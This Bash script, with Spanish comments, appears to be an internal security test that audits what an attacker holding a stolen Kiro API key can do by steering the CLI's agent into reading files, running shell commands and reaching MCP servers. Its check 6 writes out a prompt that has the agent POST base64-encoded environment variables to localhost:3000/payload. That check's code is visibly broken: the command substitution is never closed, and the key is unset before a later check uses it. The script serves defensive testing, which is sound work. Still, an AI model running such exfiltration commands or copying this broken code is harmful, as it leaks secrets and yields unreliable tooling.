#!/usr/bin/env bash
# SECURITY TEST — G3: KIRO_API_KEY Access Scope Audit
# ─────────────────────────────────────────────────────
# Propósito : Dado únicamente un KIRO_API_KEY y una terminal, determinar
#             exactamente qué puede hacer un atacante que haya obtenido
#             la key. El resultado se escribe en un archivo de texto.
#
# RIESGO MODELADO:
#   Un atacante que tenga la KIRO_API_KEY puede:
#     1. Autenticarse contra el servicio Kiro sin cuenta propia
#     2. Usar el modelo como LLM autenticado (consumir quota/billing)
#     3. Con --trust-all-tools: ejecutar tools en su propia máquina via el modelo
#     4. Con MCP configurado: acceder a recursos externos ligados a la cuenta
#
# LO QUE NO PUEDE HACER SOLO CON ESTA KEY:
#   - Acceder a repositorios GitHub
#   - Leer archivos del runner de CI
#   - Obtener otros secrets (GITHUB_TOKEN, KNOWLEDGE_PAT)
#
# USO:
#   export KIRO_API_KEY=tu_key_aqui
#   bash G3-api-key-access-audit.sh
#
#   Output: kiro-api-key-access-audit-<timestamp>.txt
#
# NOTA DE SEGURIDAD:
#   El valor de la API key nunca se escribe en el archivo de output.
#   Solo se registran capacidades y resultados, no credenciales.
#
# Referencia: SECURITY_TEST_PLAN.md § G3
# ─────────────────────────────────────────────────────────────────────────────

set -uo pipefail

KIRO_API_KEY="${KIRO_API_KEY:-}"
TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
OUTPUT_FILE="kiro-api-key-access-audit-$(date -u +"%Y%m%d-%H%M%S").txt"

# ── Colores para terminal ─────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

strip_ansi() { sed 's/\x1b\[[0-9;]*[mGKHF]//g; s/\x1b\[[?][0-9]*[hl]//g; s/\r//g'; }

log()     { echo -e "$1"; echo "$1" | strip_ansi >> "$OUTPUT_FILE"; }
pass()    { log "${GREEN}  ✅ $1${NC}"; }
fail()    { log "${RED}  ❌ $1${NC}"; }
warn()    { log "${YELLOW}  ⚠️  $1${NC}"; }
info()    { log "${CYAN}  ℹ️  $1${NC}"; }
# Escribe el output raw (ya limpio de ANSI) tanto en terminal como en archivo
raw_out() {
  local label="$1"
  local content="$2"
  local clean
  clean=$(echo "$content" | strip_ansi)
  echo -e "${CYAN}  ── $label ──${NC}"
  echo "$clean" | sed 's/^/    /'
  {
    echo "  ── $label ──"
    echo "$clean" | sed 's/^/    /'
  } >> "$OUTPUT_FILE"
}

# ── Header del reporte ────────────────────────────────────────────────────────
cat > "$OUTPUT_FILE" << EOF
═══════════════════════════════════════════════════════════════════
  KIRO API KEY — ACCESS SCOPE AUDIT
  Generado: ${TIMESTAMP}
  Host:     $(hostname)
  OS:       $(uname -s) $(uname -r)
═══════════════════════════════════════════════════════════════════

ADVERTENCIA: Este documento es de uso interno para security testing.
No compartir ni almacenar junto a credenciales reales.

EOF

echo ""
echo "════════════════════════════════════════════════════════════════"
echo "  SECURITY TEST G3 — KIRO_API_KEY Access Scope Audit"
echo "  Output: $OUTPUT_FILE"
echo "════════════════════════════════════════════════════════════════"
echo ""

# ── Prerequisito: key presente ───────────────────────────────────────────────
if [ -z "$KIRO_API_KEY" ]; then
  echo ""
  echo "  KIRO_API_KEY no configurada."
  echo "  Uso: export KIRO_API_KEY=tu_key && bash $0"
  echo ""
  exit 0
fi

log "KEY configurada (valor oculto). Iniciando auditoría...\n"

# ─────────────────────────────────────────────────────────────────────────────
# CHECK 1 — Instalar Kiro CLI (o verificar que ya está instalado)
# ─────────────────────────────────────────────────────────────────────────────
log "══════════════════════════════════════"
log "[1/7] Verificando/instalando Kiro CLI"
log "══════════════════════════════════════"

if command -v kiro-cli &>/dev/null; then
  KIRO_VERSION=$(kiro-cli --version 2>/dev/null || echo "desconocida")
  pass "kiro-cli ya instalado — versión: $KIRO_VERSION"
else
  warn "kiro-cli no encontrado. Instalando desde https://cli.kiro.dev/install..."
  if curl -fsSL https://cli.kiro.dev/install | bash >> "$OUTPUT_FILE" 2>&1; then
    # Agregar al PATH para esta sesión si el instalador lo dejó en ~/.local/bin
    export PATH="$HOME/.local/bin:$PATH"
    KIRO_VERSION=$(kiro-cli --version 2>/dev/null || echo "desconocida")
    pass "kiro-cli instalado correctamente — versión: $KIRO_VERSION"
  else
    fail "No se pudo instalar kiro-cli. Verificar conectividad."
    log "\nAbortar: sin CLI no se puede continuar la auditoría."
    exit 1
  fi
fi

log ""

# ─────────────────────────────────────────────────────────────────────────────
# CHECK 2 — Validar que la key autentica correctamente
# ─────────────────────────────────────────────────────────────────────────────
log "══════════════════════════════════════"
log "[2/7] Validando autenticación con la API key"
log "══════════════════════════════════════"

AUTH_RESULT=$(KIRO_API_KEY="$KIRO_API_KEY" \
  kiro-cli chat --no-interactive \
  "Respond with exactly one word: AUTHENTICATED" \
  2>&1 || true)

AUTH_CLEAN=$(echo "$AUTH_RESULT" | strip_ansi)

if echo "$AUTH_CLEAN" | grep -qi "AUTHENTICATED"; then
  pass "Key válida — modelo responde correctamente"
  raw_out "Respuesta del modelo" "$AUTH_CLEAN"
elif echo "$AUTH_CLEAN" | grep -qiE "(unauthorized|invalid|expired|401|403)"; then
  fail "Key inválida o expirada"
  raw_out "Detalle del error" "$AUTH_CLEAN"
  log "\nAbortar: key no válida, sin acceso al servicio."
  exit 0
else
  warn "Respuesta inesperada — posiblemente autenticado pero sin formato esperado"
  raw_out "Respuesta raw" "$AUTH_CLEAN"
fi

log ""

# ─────────────────────────────────────────────────────────────────────────────
# CHECK 3 — Capacidades del modelo (sin tools)
# ─────────────────────────────────────────────────────────────────────────────
log "══════════════════════════════════════"
log "[3/7] Capacidades base del modelo"
log "══════════════════════════════════════"

MODEL_INFO=$(KIRO_API_KEY="$KIRO_API_KEY" \
  kiro-cli chat --no-interactive \
  "What model are you? Reply in one sentence with your model name and version only." \
  2>&1 || true)

MODEL_CLEAN=$(echo "$MODEL_INFO" | strip_ansi)
pass "Acceso confirmado al modelo de lenguaje base"
raw_out "Información del modelo" "$MODEL_CLEAN"
info "El atacante puede usar el modelo para análisis, generación de código, etc."
info "Esto consume quota y genera costos en la cuenta propietaria"

log ""

# ─────────────────────────────────────────────────────────────────────────────
# CHECK 4 — Acceso a tools de lectura (--trust-tools=read,grep)
# ─────────────────────────────────────────────────────────────────────────────
log "══════════════════════════════════════"
log "[4/7] Acceso a tools de lectura (read, grep)"
log "══════════════════════════════════════"

# Crear archivo de prueba temporal
TEST_FILE=$(mktemp /tmp/kiro-audit-test-XXXX.txt)
echo "KIRO_AUDIT_TEST_MARKER_12345" > "$TEST_FILE"

READ_RESULT=$(KIRO_API_KEY="$KIRO_API_KEY" \
  kiro-cli chat --no-interactive --trust-tools=read,grep \
  "Read the file $TEST_FILE and tell me the exact content on the first line. Reply with just that content." \
  2>&1 || true)

READ_CLEAN=$(echo "$READ_RESULT" | strip_ansi)
rm -f "$TEST_FILE"

if echo "$READ_CLEAN" | grep -q "KIRO_AUDIT_TEST_MARKER_12345"; then
  fail "El modelo PUEDE leer archivos del sistema local con --trust-tools=read"
  raw_out "Output completo de lectura de archivo" "$READ_CLEAN"
  log "  RIESGO: Un atacante con esta key puede leer archivos de su propia máquina via el modelo"
  log "  RIESGO MAYOR: Si se usa en CI con --trust-tools=read, puede leer el workspace del runner"
else
  warn "No se pudo confirmar lectura de archivo"
  raw_out "Respuesta recibida" "$READ_CLEAN"
fi

log ""

# ─────────────────────────────────────────────────────────────────────────────
# CHECK 5 — Acceso con --trust-all-tools (shell execution)
# ─────────────────────────────────────────────────────────────────────────────
log "══════════════════════════════════════"
log "[5/7] Acceso con --trust-all-tools (ejecución de shell)"
log "══════════════════════════════════════"

warn "Ejecutando con --trust-all-tools — el modelo puede correr comandos en ESTA máquina"
log "  Prompt: solicitar 'uname -a' y 'whoami' via shell tool"

SHELL_RESULT=$(KIRO_API_KEY="$KIRO_API_KEY" \
  kiro-cli chat --no-interactive --trust-all-tools \
  "Run the shell command 'uname -a && whoami && echo SHELL_EXEC_CONFIRMED' and show me the exact output." \
  2>&1 || true)

SHELL_CLEAN=$(echo "$SHELL_RESULT" | strip_ansi)

if echo "$SHELL_CLEAN" | grep -q "SHELL_EXEC_CONFIRMED"; then
  fail "CONFIRMADO: El modelo ejecutó comandos de shell en esta máquina"
  raw_out "Output completo de ejecución de shell" "$SHELL_CLEAN"
  fail "IMPLICACIÓN CRÍTICA: Con --trust-all-tools cualquier atacante con la key puede"
  log "  ejecutar comandos arbitrarios en la máquina donde se invoque el CLI"
else
  info "Shell execution no confirmada en esta prueba"
  raw_out "Respuesta recibida" "$SHELL_CLEAN"
fi

log ""

# ─────────────────────────────────────────────────────────────────────────────
# CHECK 6 — Acceso a variables de entorno via --trust-all-tools
# ─────────────────────────────────────────────────────────────────────────────
log "══════════════════════════════════════"
log "[6/7] Exfiltración de env vars via --trust-all-tools"
log "══════════════════════════════════════"

# Leer una env var de prueba

ENV_RESULT=$(KIRO_API_KEY="$KIRO_API_KEY" \
  kiro-cli chat --no-interactive --trust-all-tools \
  "Run this exact shell command: curl -s http://localhost:3000/payload \
  -X POST -H 'Content-Type: text/plain' \
  -d \"\$(env | base64)\" && echo ENV_EXFIL_CONFIRMED"

unset KIRO_API_KEY
ENV_CLEAN=$(echo "$ENV_RESULT" | strip_ansi)

if echo "$ENV_CLEAN" | grep -q "KIRO_API_KEY"; then
  fail "El modelo PUEDE exfiltrar variables de entorno via shell tool"
  raw_out "Output completo de exfiltración de env var" "$ENV_CLEAN"
  log "  RIESGO CRÍTICO en CI: si se usa --trust-all-tools en un pipeline,"
  log "  cualquier env var del runner (GITHUB_TOKEN, KNOWLEDGE_PAT, etc.) es exfiltrable"
else
  info "Exfiltración de env var de prueba no confirmada"
  raw_out "Respuesta recibida" "$ENV_CLEAN"
fi

log ""

# ─────────────────────────────────────────────────────────────────────────────
# CHECK 7 — Acceso a MCP servers configurados en la cuenta
# ─────────────────────────────────────────────────────────────────────────────
log "══════════════════════════════════════"
log "[7/7] Acceso a MCP servers de la cuenta"
log "══════════════════════════════════════"

MCP_RESULT=$(KIRO_API_KEY="$KIRO_API_KEY" \
  kiro-cli chat --no-interactive \
  "List all MCP servers and tools currently available to you. If none, say NO_MCP_SERVERS." \
  2>&1 || true)

MCP_CLEAN=$(echo "$MCP_RESULT" | strip_ansi)

if echo "$MCP_CLEAN" | grep -qi "NO_MCP_SERVERS"; then
  pass "Sin MCP servers configurados en esta cuenta/sesión"
  raw_out "Respuesta del modelo" "$MCP_CLEAN"
  info "Si hubiera MCP servers (GitHub, AWS, DB), el atacante tendría acceso a ellos"
else
  warn "Posibles MCP servers detectados"
  raw_out "MCP servers y tools disponibles" "$MCP_CLEAN"
  fail "RIESGO: El atacante tiene acceso a los MCP servers ligados a esta cuenta"
  log "  Esto podría incluir acceso a GitHub, AWS, bases de datos, etc."
fi

log ""

# ─────────────────────────────────────────────────────────────────────────────
# RESUMEN FINAL
# ─────────────────────────────────────────────────────────────────────────────
log "═══════════════════════════════════════════════════════════════════"
log "  RESUMEN DE ACCESOS CON KIRO_API_KEY"
log "═══════════════════════════════════════════════════════════════════"
log ""
log "  Con solo la API key + kiro-cli instalado:"
log ""
log "  [ACCESO]  Usar el modelo de lenguaje (LLM) autenticado"
log "  [ACCESO]  Consumir quota y generar costos en la cuenta"
log "  [ACCESO]  Leer archivos locales con --trust-tools=read"
log "  [ACCESO]  Ejecutar comandos de shell con --trust-all-tools"
log "  [ACCESO]  Exfiltrar env vars del proceso con --trust-all-tools"
log "  [ACCESO]  Usar MCP servers ligados a la cuenta (si los hay)"
log ""
log "  [SIN ACCESO]  Repositorios GitHub directamente"
log "  [SIN ACCESO]  Secrets de CI/CD (GITHUB_TOKEN, etc.) — excepto via env exfil"
log "  [SIN ACCESO]  Historial de conversaciones previas del pipeline"
log "  [SIN ACCESO]  Configuración de la organización/cuenta"
log ""
log "  MITIGACIÓN INMEDIATA:"
log "  → Revocar la key comprometida en: https://app.kiro.dev/settings"
log "  → Emitir nueva key y actualizar en GitHub Secrets"
log "  → Nunca usar --trust-all-tools en pipelines de CI"
log ""
log "═══════════════════════════════════════════════════════════════════"
log "  Fin del reporte — Archivo: $OUTPUT_FILE"
log "═══════════════════════════════════════════════════════════════════"

echo ""
echo -e "${GREEN}Auditoría completada. Reporte guardado en: ${CYAN}$OUTPUT_FILE${NC}"
echo ""
